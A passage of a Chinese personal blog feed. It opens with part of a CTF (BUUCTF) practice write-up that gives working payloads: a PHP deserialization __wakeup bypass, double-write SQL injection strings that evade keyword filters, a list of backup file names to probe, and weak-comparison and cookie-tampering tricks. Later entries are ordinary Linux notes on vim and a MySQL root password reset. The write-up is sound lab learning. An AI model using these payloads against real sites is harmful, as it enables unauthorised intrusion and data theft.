class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">':2:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">':3:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//绕过__wakeup</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接传参得到 flag{bf2e4c0e-baf2-4f7f-81a1-0c4857a3366c}</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409606.png" alt="可爱猫猫"></p><h2 id="17-极客大挑战-2019-BabySQL"><a href="#17-极客大挑战-2019-BabySQL" class="headerlink" title="17.[极客大挑战 2019]BabySQL"></a>17.[极客大挑战 2019]BabySQL</h2><p>这个SQL注入相比较之前的就是多了过滤设置，而且这里主要考察的<strong>双写绕过</strong>，其中做题容易忽略的一点就是前面过滤的后面给忘了hh:</p><p>1.判断注入点，再密码位置输入<code>1'</code>，发现报错，说明存在SQL注入。</p><p>2.接着判断字段数，使用<code>order by 8 # </code>，发现报错：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409607.png"></p><p>看到<code>or</code>和<code>by</code>没了，说明被过滤了，拿过滤什么就双写什么改为：<code>oorrder bbyy 4 #</code>，接着改为3就对了说明是三段。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409608.png"></p><p>3.看回显哪部分: <code>union select 1,2,3</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409609.png"></p><p>看到<code>union,select</code>也被过滤了，再改：<code>1' ununionion selselectect 1,2,3 # </code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409610.png"></p><p>4.接下来就是正常步骤了，查库名：<code>1' ununionion seselectlect 1,database(),3 #</code>得到使用的是<code>geek</code>，那就先接着查</p><p>5.查表名<code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) from information_schema.tables where table_schema='geek'),3 #</code>,最坑的来了：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409611.png"></p><p>发现<code>where</code>和<code>.tables</code>前面的没了，这里记得<code>information</code>里面有<code>or</code>!!!，给过滤了，同时之后看到from也给过滤了，所以修改之后为：</p><p><code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'),3 #</code>，就得到表名了，之后就没啥新的过滤了，最后得到flag。</p><h2 id="18-ACTF2020-新生赛-BackupFile"><a href="#18-ACTF2020-新生赛-BackupFile" class="headerlink" title="18.[ACTF2020 新生赛]BackupFile"></a>18.[ACTF2020 新生赛]BackupFile</h2><p>这题考查的主要是<strong>源码泄露</strong>以及<strong>弱类型比较</strong>。</p><p>网站备份压缩文件：管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。常见的备份文件后缀：</p><pre class="line-numbers language-none"><code class="language-none">.index.php.swpindex.php.swpindex.php.bak  //本题提示的bak备份文件.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下来之后就可以得到一个index.php.bak备份文件，看到源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以知道是弱类型比较：对数据的类型要求并不严格，可以让数据类型互相转换。</p><p><strong>“==”类型转换的规则</strong>：</p><p>1、字符串和数字比较，<font color="#FF5E3A" size="3">字符串会自动被转换成数字</font>。</p><p>​        “admin”==0(true)：admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是true。</p><p>2、混合字符串转换成数字，看字符串的第一个。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">“<span class="token number">1</span>admin” <span class="token operator">==</span> <span class="token number">1</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>类似的还有MD5弱类型比较等。所以payload就为：<code>index.php?key=123</code>，得到flag{0951de20-f469-458f-8e3b-ffc4d519580a}</p><h2 id="19-护网杯-2018-easy-tornado"><a href="#19-护网杯-2018-easy-tornado" class="headerlink" title="19.[护网杯 2018]easy_tornado"></a>19.[护网杯 2018]easy_tornado</h2><p>主要考察的是<font color="#FF5E3A" size="3">模板注入</font></p><p>相关学习：<a href="https://www.cnblogs.com/wjw-zm/p/12741047.html">Python-模板注入 - ZM思 - 博客园</a></p><p>首先根据<code>easy_tornado</code>和<code>render</code>函数可知这个题和服务器模板注入有关。因为<a href="https://so.csdn.net/so/search?q=render&amp;spm=1001.2101.3001.7020">render</a>（）是tornado里的函数，可以生成html模板。tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。（详情请看<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI完全学习</a>）。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535246.png" alt="验证"></p><p>但是目前还缺一个<code>cookie_secret</code>，这是就可以查这个一般在模板框架的什么位置，通过查阅发现在handler.settings中，详细说明见：</p><p><a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">https://blog.csdn.net/weixin_45642610/article/details/112519061</a></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535249.png" alt="handler.settings"></p><p>这样就得到密钥了，就可以根据公式拿flag了。这里贴上md5加密脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建md5加密对象</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">"/fllllllllllllag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#更新对象要加密的字符串，要先UTF-8编码成二进制，因为md5只加密二进制</span>s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#以十六进制输出密文</span><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#按要求重复步骤</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"88418b16-e8cf-4a57-9b43-2abd81796dea"</span><span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="20-极客大挑战-2019-BuyFlag"><a href="#20-极客大挑战-2019-BuyFlag" class="headerlink" title="20.[极客大挑战 2019]BuyFlag"></a>20.[极客大挑战 2019]BuyFlag</h2><p>这题考查的主要是</p><p>进入题目看到一段话：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535251.png"></p><p>可以看到有身份认证相关，同时还有password，可以先看看cookie，看到user=0，大致猜个0是false，1是true，所以改为1。</p><p>然后查看页面源代码发现有段代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"password can't be number&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Password Right!&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是弱比较，payload：password=404a，成功绕过:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535252.png"></p><p>此时就差买flag了，注意上面的源码，也有<code>post money</code>，这个别忘了！那就payload：password=404a&amp;money=100000000:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535253.png"></p><p>提示太长了，那就用<font color="#FF5E3A" size="3">科学计数法</font>，payload：password=404a&amp;money=10e8，得到flag😊：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535254.png"></p><hr><p>好啦，又是十道题，继续努力，主要就是见题型吧，以及拿到一道题该怎么出发。</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659121.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第三章</title>
      <link href="/posts/myh10007.html"/>
      <url>/posts/myh10007.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第三章：使用编辑器"><a href="#第三章：使用编辑器" class="headerlink" title="第三章：使用编辑器"></a>第三章：使用编辑器</h2><h3 id="3-1-检查vim软件包，安装vim"><a href="#3-1-检查vim软件包，安装vim" class="headerlink" title="3.1 检查vim软件包，安装vim"></a>3.1 检查<code>vim</code>软件包，安装<code>vim</code></h3><p>有的发行版默认的<code>vim</code>编辑器并不是完整的包，只是<code>vim.tiny  </code>，提供少量的编辑功能。所以首先检查一下包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">which</span> <span class="token function">vi</span>/usr/bin/vi$ readlink -f /usr/bin/vi    <span class="token comment">#readlink –f命令能够立刻找出链接文件的最后一环。</span>/usr/bin/vim.tiny<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时就要安装<code>vim</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">vim</span>$ readlink -f /usr/bin/vi/usr/bin/vim.basic    <span class="token comment">#安装成功了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-vim基础"><a href="#3-2-vim基础" class="headerlink" title="3.2 vim基础"></a>3.2 vim基础</h3><p>启动<code>vim</code>编辑器:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如在启动vim时未指定文件名，或者这个文件不存在， vim会<strong>开辟一段新的缓冲区域</strong>来编辑。如果你在命令行下指定了一个已有文件的名字， vim会将文件的整个内容都<strong>读到一块缓冲区域</strong>来准备编辑 。</p><p>vim编辑器会检测会话终端的类型，并用<strong>全屏模式</strong>将整个控制台窗口作为编辑器区域。<br>最初的vim编辑窗口显示了文件的内容（如果有内容的话），并在窗口的底部显示了一条消息行。如果文件内容并未占据整个屏幕， vim会在<strong>非文件内容行放置一个波浪线</strong> 。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711057.png"></p><p>vim编辑器有<strong>两种操作模式</strong>：</p><ul><li><font color="#FF5E3A" size="3">普通模式</font></li><li><font color="#FF5E3A" size="3">插入模式</font></li></ul><p>刚打开要编辑的文件时（或新建一个文件时）， vim编辑器会进入普通模式。<font color="#FF5E3A" size="3">在普通模式中， vim编辑器会将按键解释成命令。</font>  </p><p>在插入模式下， vim会将你在当前光标位置输入的每个键都插入到缓冲区。<font color="#FF5E3A" size="3">按下i键就可以进入插入模式</font>。要退出插入模式回到普通模式，按下键盘上的<strong>退出键（ ESC键）</strong>就可以了。  </p><p>在普通模式中，可以用方向键在文本区域<strong>移动光标</strong> 或者使用如下键：</p><ul><li>h：左移一个字符。  </li><li>j：下移一行（文本中的下一行）。  </li><li>k：上移一行（文本中的上一行）。  </li><li>l：右移一个字符。  </li></ul><p>在大的文本文件中一行一行地来回移动会特别麻烦，幸而vim提供了一些能够提高移动速度<br>的命令。</p><ul><li><code>PageDown</code>（或Ctrl+F）：下翻一屏。</li><li><code>PageUp</code>（或Ctrl+B）：上翻一屏。</li><li>G：移到缓冲区的最后一行。</li><li><code>num G</code>：移动到缓冲区中的第<code>num</code>行。</li><li>gg：移到缓冲区的第一行。  </li></ul><p>vim编辑器在普通模式下有个特别的功能叫<font color="#FF5E3A" size="3">命令行模式</font>。命令行模式提供了一个交互式命令行，<strong>可以输入额外的命令来控制vim的行为</strong>。要进入命令行模式，在普通模式下<font color="#FF5E3A" size="3">按下冒号键</font>。光标会移动到消息行，然后出现冒号，等待输入命令。  </p><p>在命令行模式下有几个命令可以<strong>将缓冲区的数据保存到文件中并退出vim</strong>。</p><ul><li>q：如果未修改缓冲区数据，退出</li><li>q!：<strong>取消</strong>所有对缓冲区数据的修改并退出。</li><li>w filename：将文件保存到另一个文件中。</li><li>wq：将缓冲区数据<strong>保存</strong>到文件中并退出。 </li></ul><h3 id="3-3-编辑数据"><a href="#3-3-编辑数据" class="headerlink" title="3.3 编辑数据"></a>3.3 编辑数据</h3><p>在插入模式下，你可以向缓冲区插入数据。然而有时将数据输入到缓冲区中后，你需要再对其进行添加或删除。在<strong>普通模式下</strong>， vim编辑器提供了一些命令来<strong>编辑缓冲区中的数据</strong>。下表列出了一些常用的vim编辑命令。  </p><hr><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>dd</td><td>删除当前光标所在行</td></tr><tr><td>x</td><td>删除当前光标所在位置的字符</td></tr><tr><td>dw</td><td>删除当前光标所在位置的单词</td></tr><tr><td>d$</td><td>删除当前光标所在位置至行尾的内容</td></tr><tr><td>u</td><td>撤销前一编辑命令</td></tr><tr><td>J</td><td>删除当前光标所在行行尾的换行符（拼接行）</td></tr><tr><td>A</td><td>在当前光标所在行行尾追加数据（直接进入了插入模式）</td></tr><tr><td>a</td><td>在当前光标后追加数据（直接进入了插入模式）</td></tr><tr><td>r char</td><td>用char替换当前光标所在位置的单个字符</td></tr></tbody></table><hr><p>说明 在vim编辑器的普通模式下使用退格键（ Backspace键）和删除键（ Delete键）时要留心。vim编辑器通常会<strong>将删除键识别成x命令</strong>的功能，删除当前光标所在位置的字符。 vim编辑器在普通模式下通常不识别退格键。  </p><hr><h3 id="3-4-复制和粘贴"><a href="#3-4-复制和粘贴" class="headerlink" title="3.4 复制和粘贴"></a>3.4 复制和粘贴</h3><h4 id="3-4-1-粘贴内容"><a href="#3-4-1-粘贴内容" class="headerlink" title="3.4.1 粘贴内容"></a>3.4.1 粘贴内容</h4><p><font color="#FF5E3A" size="3">vim在删除数据时，实际上会将数据保存在单独的一个寄存器中。可以用p命令取回数据。 </font> </p><p>举例来说，可以用<code>dd</code>命令删除一行文本，然后把光标移动到缓冲区的某个要放置该行文本的位置，然后用<code>p</code>命令。该命令会将文本插入到当前光标所在行之后。可以将它和任何删除文本的命令一起搭配使用。  (注意p命令粘贴的只是上<strong>一次</strong>删除的内容。)</p><h4 id="3-4-2-复制内容"><a href="#3-4-2-复制内容" class="headerlink" title="3.4.2 复制内容"></a>3.4.2 复制内容</h4><p>vim中复制命令是y（代表yank）。可以在y后面使用和d命令相同的第二字符（ yw表示复制一个单词， y$表示复制到行尾）。在复制文本后，把光标移动到你想放置文本的地方，输入p命令。复制的文本就会出现在该位置  。</p><h4 id="3-4-3-复制内容-可视化模式"><a href="#3-4-3-复制内容-可视化模式" class="headerlink" title="3.4.3 复制内容-可视化模式"></a>3.4.3 复制内容-可视化模式</h4><p>按下<code>v</code>键进入可视化模式。下一步，移动光标来覆盖你想要复制的文本（甚至可以向下移动几行来复制更多行的文本）。在移动光标时， vim会高亮显示复制区域的文本。在覆盖了要复制的文本后，按y键来激活复制命令。移动光标到要放置的位置，使用p命令来粘贴。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711059.png"></p><h3 id="3-5-查找和替换"><a href="#3-5-查找和替换" class="headerlink" title="3.5 查找和替换"></a>3.5 查找和替换</h3><h4 id="3-5-1-查找"><a href="#3-5-1-查找" class="headerlink" title="3.5.1 查找"></a>3.5.1 查找</h4><p>按下斜线 <code>/键</code>，光标会跑到消息行，然后vim会显示出斜线。在输入你要查找的文本后，按下回车键。会出现三种可能的结果：</p><ul><li>要查找的文本出现在光标当前位置之后，则光标会跳到该文本出现的第一个位置。  </li><li>要查找的文本未在光标当前位置之后出现，则光标会绕过文件末尾，出现在该文本所在的第一个位置（并用一条消息指明）。</li><li>输出一条错误消息，说明在文件中没有找到要查找的文本。  </li></ul><p>要继续查找同一个单词，按下斜线键，然后按回车键。或者使用<code>n键</code>，表示下一个（ next）。    </p><h4 id="3-5-2-替换"><a href="#3-5-2-替换" class="headerlink" title="3.5.2 替换"></a>3.5.2 替换</h4><p><font color="#FF5E3A" size="3">必须进入命令行模式才能使用替换命令。</font>替换命令的格式是：<code>:s/old/new/</code> ，vim编辑器会跳到old第一次出现的地方，并用new来替换。  </p><p>可以对替换命令作一些修改来替换多处文本：  </p><ul><li><code>:s/old/new/g</code>：替换光标所在行的所有old。  </li><li><code>:n,ms/old/new/g</code>：替换行号n和m之间所有old。  </li><li><code>:%s/old/new/g</code>：替换整个文件中的所有old。  </li><li><code>:%s/old/new/gc</code>：替换整个文件中的所有old，但在每次出现时提示。  </li></ul><hr><p>这里就是基本的vim编辑器命令，需要经常使用增加手指记忆，还有许多其他的编辑器，先学会这个再学学别的~</p><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711060.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux登录mysql报错</title>
      <link href="/posts/myh10006.html"/>
      <url>/posts/myh10006.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysql登录报错：ERROR-1045-28000"><a href="#mysql登录报错：ERROR-1045-28000" class="headerlink" title="mysql登录报错：ERROR 1045 (28000)"></a>mysql登录报错：ERROR 1045 (28000)</h2><p>在使用xshell连接服务器登陆mysql的时候，出现Access denied for user ‘root’@’localhost’ (using password: YES) 拒绝访问。emmm这就很尴尬，接着我登上服务器的终端也不行，查了一下解决方法如下：</p><h4 id="1、vim-etc-my-cnf文件"><a href="#1、vim-etc-my-cnf文件" class="headerlink" title="1、vim /etc/my.cnf文件"></a>1、vim /etc/my.cnf文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 [mysqld] 后添加  skip-grant-tables （跳过检查），然后按esc、ZZ退出。</p><h4 id="2、重启MySQL服务："><a href="#2、重启MySQL服务：" class="headerlink" title="2、重启MySQL服务："></a>2、重启MySQL服务：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、修改密码"><a href="#3、修改密码" class="headerlink" title="3、修改密码"></a>3、修改密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能会出现  ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement  的报错，输入 ：flush privileges;</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、再次重新设置密码"><a href="#4、再次重新设置密码" class="headerlink" title="4、再次重新设置密码"></a>4、再次重新设置密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5、重设远程访问"><a href="#5、重设远程访问" class="headerlink" title="5、重设远程访问"></a>5、重设远程访问</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '你的密码' WITH GRANT OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6、把skip-grant-tables删除"><a href="#6、把skip-grant-tables删除" class="headerlink" title="6、把skip-grant-tables删除"></a>6、把skip-grant-tables删除</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7、重启MySQL"><a href="#7、重启MySQL" class="headerlink" title="7、重启MySQL"></a>7、重启MySQL</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以正常登陆了~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214197.png" style="zoom:150%;"><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214199.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第二章</title>
      <link href="/posts/myh10005.html"/>
      <url>/posts/myh10005.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第二章：基本的-bash-shell-命令"><a href="#第二章：基本的-bash-shell-命令" class="headerlink" title="第二章：基本的 bash shell 命令"></a>第二章：基本的 bash shell 命令</h2><h3 id="2-1浏览文件系统"><a href="#2-1浏览文件系统" class="headerlink" title="2.1浏览文件系统"></a>2.1浏览文件系统</h3><h4 id="2-1-1-Linux文件系统"><a href="#2-1-1-Linux文件系统" class="headerlink" title="2.1.1 Linux文件系统"></a>2.1.1 Linux文件系统</h4><p>Linux不同于WIndows，在路径名中不使用驱动器盘符。  </p><p>Linux将文件存储在<font color="#FF5E2A" size="4"><strong>单个目录结构</strong></font>中，这个目录被称为<font color="#FF5E2A" size="4"><strong>虚拟目录（ virtual directory）</strong></font>。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构<strong>只包含一个称为<font color="#FF5E2A" size="4">根（ root）目录</font>的基础目录</strong>。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。  </p><p>在Linux PC上安装的<strong>第一块硬盘</strong>称为根驱动器。<strong>根驱动器包含了虚拟目录的核心</strong>，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为<strong>挂载点（ mount point）</strong>。<font color="#FF5E2A" size="4">挂载点是虚拟目录中用于分配额外存储设备的目录</font>。虚拟目录会让文件和目录出现在这些挂载点目录中，然而<strong>实际上它们却存储在另外一个驱动器</strong>中。 </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635094.png"></p><p>如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。</p><p>​                                                                                        <strong>常见的Linux目录名称</strong></p><table><thead><tr><th align="center"><strong>/</strong></th><th align="center">虚拟目录的根目录。通常不会在这里存储文件</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">二进制目录，存放许多用户级的GNU工具</td></tr><tr><td align="center">/bot</td><td align="center">启动目录，存放启动文件</td></tr><tr><td align="center">/dev</td><td align="center">设备目录， Linux在这里创建设备节点</td></tr><tr><td align="center"><strong>/etc</strong></td><td align="center"><strong>系统配置文件目录</strong></td></tr><tr><td align="center"><strong>/home</strong></td><td align="center">主目录， Linux在这里创建<strong>用户目录</strong></td></tr><tr><td align="center">/lib</td><td align="center">库目录，存放系统和应用程序的库文件</td></tr><tr><td align="center">/media</td><td align="center">媒体目录，可移动媒体设备的常用<strong>挂载点</strong></td></tr><tr><td align="center">/mnt</td><td align="center">挂载目录，另一个可移动媒体设备的常用挂载点</td></tr><tr><td 